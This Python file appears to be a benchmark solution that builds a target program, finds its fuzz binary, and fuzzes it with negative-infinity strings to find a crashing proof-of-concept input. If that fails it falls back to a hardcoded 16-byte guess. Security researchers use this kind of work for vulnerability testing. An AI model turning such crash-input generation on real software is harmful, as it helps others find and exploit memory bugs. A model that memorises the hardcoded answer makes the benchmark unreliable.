import os
import tarfile
import zipfile
import tempfile
import subprocess
import random
import time
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_impl(src_path)
        except Exception:
            return self._fallback_poc()

    def _solve_impl(self, src_path: str) -> bytes:
        work_dir = self._prepare_workdir(src_path)
        root_dir = self._detect_root_dir(work_dir)
        self._maybe_build(root_dir)
        bin_path = self._find_best_elf(root_dir)
        if not bin_path:
            return self._fallback_poc()
        poc = self._fuzz_for_crash(bin_path)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _prepare_workdir(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        extracted = False

        # Try tar
        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, mode="r:*") as tf:
                    tf.extractall(tmpdir)
                extracted = True
        except Exception:
            pass

        # Try zip
        if not extracted:
            try:
                if zipfile.is_zipfile(src_path):
                    with zipfile.ZipFile(src_path) as zf:
                        zf.extractall(tmpdir)
                    extracted = True
            except Exception:
                pass

        if not extracted:
            # Fallback: treat containing directory as workspace
            d = os.path.dirname(os.path.abspath(src_path))
            return d if os.path.isdir(d) else tmpdir

        return tmpdir

    def _detect_root_dir(self, base_dir: str) -> str:
        try:
            entries = [
                os.path.join(base_dir, name)
                for name in os.listdir(base_dir)
                if not name.startswith(".") and name != "__MACOSX"
            ]
        except Exception:
            return base_dir

        if len(entries) == 1 and os.path.isdir(entries[0]):
            return entries[0]
        return base_dir

    def _maybe_build(self, root_dir: str) -> None:
        scripts = ["build.sh", "build.bash", "compile.sh", "build_fuzz.sh"]
        for script in scripts:
            path = os.path.join(root_dir, script)
            if os.path.isfile(path):
                try:
                    subprocess.run(
                        ["bash", path],
                        cwd=root_dir,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=600,
                        check=False,
                    )
                except Exception:
                    pass
                break

    def _find_best_elf(self, root_dir: str) -> str | None:
        candidates = []
        for cur_root, _, files in os.walk(root_dir):
            for name in files:
                path = os.path.join(cur_root, name)
                try:
                    st = os.stat(path)
                    if not stat.S_ISREG(st.st_mode):
                        continue
                    if not (st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)):
                        continue
                    with open(path, "rb") as f:
                        magic = f.read(4)
                    if magic != b"\x7fELF":
                        continue
                    size = st.st_size
                    score = self._score_binary_name(name, size)
                    candidates.append((score, size, path))
                except Exception:
                    continue

        if not candidates:
            return None
        # Higher score better; for equal score, smaller size first
        candidates.sort(key=lambda x: (-x[0], x[1]))
        return candidates[0][2]

    def _score_binary_name(self, name: str, size: int) -> int:
        lower = name.lower()
        score = 0
        if "fuzz" in lower:
            score += 20
        if "target" in lower:
            score += 10
        if "oss" in lower:
            score += 5
        if "poc" in lower:
            score += 5
        if "test" in lower:
            score += 1
        if "example" in lower:
            score -= 1
        if "lib" in lower:
            score -= 2
        if name.endswith((".so", ".a", ".o", ".lo")):
            score -= 10
        # Slight penalty for very large binaries
        if size > 10_000_000:
            score -= 3
        return score

    def _fuzz_for_crash(self, bin_path: str) -> bytes | None:
        start_time = time.time()
        timeout_total = 50.0

        def within_time() -> bool:
            return (time.time() - start_time) < timeout_total

        def run_case(data: bytes) -> bool:
            try:
                completed = subprocess.run(
                    [bin_path],
                    input=data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=1.0,
                    check=False,
                )
            except subprocess.TimeoutExpired:
                # Treat timeout as potential crash
                return True
            except Exception:
                return False

            rc = completed.returncode
            stderr = completed.stderr or b""

            if rc < 0:
                return True
            if b"ERROR: AddressSanitizer" in stderr:
                return True
            if b"stack-buffer-overflow" in stderr:
                return True
            if b"heap-buffer-overflow" in stderr:
                return True
            if b"Segmentation fault" in stderr or b"segmentation fault" in stderr:
                return True
            return False

        # Seed patterns informed by description
        seed_bases = [
            b"-inf",
            b"-infi",
            b"-infin",
            b"-infinity",
            b"-Infinity",
            b"-INF",
            b"-INFINITY",
            b"-infx",
            b"-inff",
            b"-iNfInItY",
            b"-nan",
            b"-NaN",
            b"-nan(",
            b"--inf",
        ]
        pad_bytes = [b"A", b"0", b"x", b"9"]

        # Try simple seeds and padded versions, especially length 16
        for base in seed_bases:
            if not within_time():
                return None
            if run_case(base):
                return base
            for pad in pad_bytes:
                for total_len in (16, 20, 24, 32):
                    if not within_time():
                        return None
                    if len(base) >= total_len:
                        data = base[:total_len]
                    else:
                        data = base + pad * (total_len - len(base))
                    if run_case(data):
                        return data

        # Random fuzzing around minus + infinity-like prefixes
        rnd = random.Random(0xABCDEF)
        charset = b"0123456789abcdefABCDEFxyzXYZ+-_.inftyINF"

        max_iters = 2000
        for _ in range(max_iters):
            if not within_time():
                break
            base = rnd.choice(seed_bases)
            target_len = rnd.randint(8, 32)
            if target_len < len(base):
                data = base[:target_len]
            else:
                extra_len = target_len - len(base)
                tail = bytes(rnd.choice(charset) for _ in range(extra_len))
                data = base + tail
            # Ensure leading minus
            if not data.startswith(b"-"):
                data = b"-" + data[1:]
            if run_case(data):
                return data

        return None

    def _fallback_poc(self) -> bytes:
        # 16-byte fallback based on minus + "infinity" pattern
        return b"-infinity1234567"
